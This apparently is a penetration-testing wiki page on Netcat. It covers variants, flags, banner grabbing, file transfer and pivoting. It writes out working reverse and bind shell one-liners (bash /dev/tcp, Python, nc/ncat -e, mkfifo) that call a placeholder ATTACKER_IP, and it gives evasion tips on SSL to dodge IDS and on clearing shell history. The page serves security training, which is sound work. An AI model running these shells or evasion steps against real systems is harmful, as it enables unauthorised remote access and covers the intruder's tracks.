---
tags: [tool]
module: null
last_updated: 2026-05-13
source_count: 0
---

# Netcat

General-purpose TCP/UDP networking utility used throughout pentesting for reverse shell listeners, bind shells, banner grabbing, file transfer, and port relaying.

## Overview

Netcat reads and writes raw data across network connections using TCP or UDP. It makes no assumptions about the protocol above the transport layer, which makes it useful anywhere you need a raw socket: catching reverse shells, exfiltrating files, probing service banners, or chaining connections through hops. It has been called the "Swiss Army knife of networking" because it replaces a dozen other tools for ad-hoc network tasks.

Two major variants exist on Kali/Parrot:

| Variant | Binary | Notes |
|---------|--------|-------|
| OpenBSD netcat | `nc` (default symlink), `nc.openbsd` | Ships on Kali; **no `-e` flag** |
| GNU netcat | `nc.traditional` | Older; has `-e` flag; may not be installed |
| Ncat | `ncat` | Ships with nmap; SSL support, brokering, full `-e` support |

On modern Kali `nc` defaults to OpenBSD netcat. Scripts that rely on `-e` will silently fail unless rewritten for `ncat` or `mkfifo` patterns.

## Installation

```bash
# Check what's installed
nc --version 2>&1 | head -1
which ncat && ncat --version 2>&1 | head -1

# Install / ensure ncat is available (ships with nmap)
sudo apt install nmap -y

# Install GNU netcat (has -e flag)
sudo apt install netcat-traditional -y

# Verify
nc.traditional -h 2>&1 | head -5
```

## Basic Syntax

```bash
# Connect to a host:port (client mode)
nc [options] <host> <port>

# Listen on a port (server mode)
nc -lvnp <port>
```

## Flags & Options

| Flag | Meaning |
|------|---------|
| `-l` | Listen mode (server) |
| `-v` | Verbose — print connection status |
| `-vv` | More verbose |
| `-n` | No DNS — numeric IPs only; faster |
| `-p <port>` | Local port (used with `-l`) |
| `-u` | UDP instead of TCP |
| `-e <cmd>` | Execute command on connect (**GNU/ncat only**; not OpenBSD) |
| `-k` | Keep listening after client disconnects (ncat) |
| `-w <secs>` | Timeout for idle connections |
| `-z` | Zero-I/O mode; scan without sending data |
| `--ssl` | Wrap in SSL/TLS (ncat only) |
| `-q <secs>` | Quit after EOF + delay (GNU netcat) |

## Common Pentest Use Cases

### Reverse Shell Listener

The most common pentesting use. Attacker listens; target connects back.

```bash
# Attacker — wait for incoming shell
nc -lvnp 4444

# Target — execute one of the following to connect back:
# Bash (requires /dev/tcp support)
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python 3
python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("ATTACKER_IP",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'

# GNU netcat with -e
nc.traditional -e /bin/bash ATTACKER_IP 4444

# ncat with -e
ncat -e /bin/bash ATTACKER_IP 4444

# mkfifo (works with OpenBSD nc, no -e needed)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
```

### Bind Shell

Target listens; attacker connects in. Useful when outbound connections are blocked.

```bash
# Target — listen and serve a shell
ncat -lvnp 4444 -e /bin/bash
# or with mkfifo:
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp 4444 > /tmp/f

# Attacker — connect to the bind shell
nc -nv TARGET_IP 4444
```

### Banner Grabbing

Connect to a service and read its banner. Substitute for telnet when telnet is absent.

```bash
nc -nv TARGET_IP 21       # FTP
nc -nv TARGET_IP 25       # SMTP
nc -nv TARGET_IP 110      # POP3
nc -nv TARGET_IP 143      # IMAP

# Send an HTTP request
echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc -nv TARGET_IP 80

# SMTP user enumeration
echo -e "VRFY root\r\n" | nc -nv TARGET_IP 25
```

### File Transfer

```bash
# Receiver — listen and write to file
nc -lvnp 4444 > received_file

# Sender — push file
nc -nv RECEIVER_IP 4444 < file_to_send

# Compress in-flight for large files
tar czf - /path/to/dir | nc -nv RECEIVER_IP 4444
# Receiver:
nc -lvnp 4444 | tar xzf -
```

### Port Relay / Pivot

Forward traffic from one port to another host:port. Useful for reaching internal hosts through a compromised box.

```bash
# On pivot host — forward local:8080 to internal:80
mkfifo /tmp/relay
nc -lvnp 8080 < /tmp/relay | nc -nv 192.168.1.10 80 > /tmp/relay

# With ncat's built-in brokering (simpler)
ncat --broker --listen -p 8080
```

### Quick Port Scan (no nmap available)

```bash
# TCP scan of a range (slow; use nmap when possible)
nc -znv TARGET_IP 20-1000 2>&1 | grep succeeded

# Single port check
nc -zv TARGET_IP 22 && echo "open" || echo "closed"
```

## Upgrading a Shell

Raw netcat shells lack job control and tab completion. Upgrade to a full TTY immediately:

```bash
# On the reverse shell — spawn a PTY with Python
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Background the shell: Ctrl-Z
# On attacker:
stty raw -echo; fg

# Back on the shell:
export TERM=xterm
stty rows 40 cols 200     # match your terminal dimensions
```

Or use `script`:

```bash
script /dev/null -c bash   # spawns bash under script, giving a PTY
```

## Gotchas & Notes

- **OpenBSD nc has no `-e` flag.** On Kali, `nc` defaults to this variant. Use `ncat -e`, `nc.traditional -e`, or the `mkfifo` pattern instead. Scripts copied from older guides that use `nc -e` will silently fail.
- **`-p` is only meaningful in listen mode.** In connect mode the local port is chosen by the OS; to bind a specific source port use `-p` with care or use ncat.
- **UDP shells are unreliable.** UDP has no handshake; dropped packets are not retransmitted. Use TCP for shells unless specifically needed.
- **Firewalls often block inbound but not outbound.** Reverse shells (target calls out) succeed in more environments than bind shells (target listens). If the target blocks all outbound, try ports 80, 443, or 53 for the listener — these are commonly permitted egress ports.
- **ncat `--ssl`** encrypts the channel, defeating cleartext IDS signatures. Useful when connection content is inspected.
- **Shell history.** Commands typed into a raw nc shell may appear in `.bash_history` on the target. Upgrade the TTY or clear history when stealth matters.
- **socat** is a more powerful alternative that handles PTYs natively (`socat TCP-LISTEN:4444 EXEC:bash,pty,stderr,setsid,sigint,sane`), at the cost of needing socat on the target.

## Related Pages

- [[shell_commands/bash]] — reverse shell one-liners
- [[attack/linux_privilege_escalation]] — where shell upgrades and listeners are frequently needed
- [[tools/utility/ssh]] — alternative for persistent tunneling and port forwarding

## Sources

_No raw source file — written from tool knowledge._
